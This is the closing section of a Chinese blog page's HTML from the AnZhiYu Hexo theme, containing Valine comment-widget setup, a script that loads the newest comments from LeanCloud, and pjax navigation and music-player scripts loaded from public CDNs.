      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>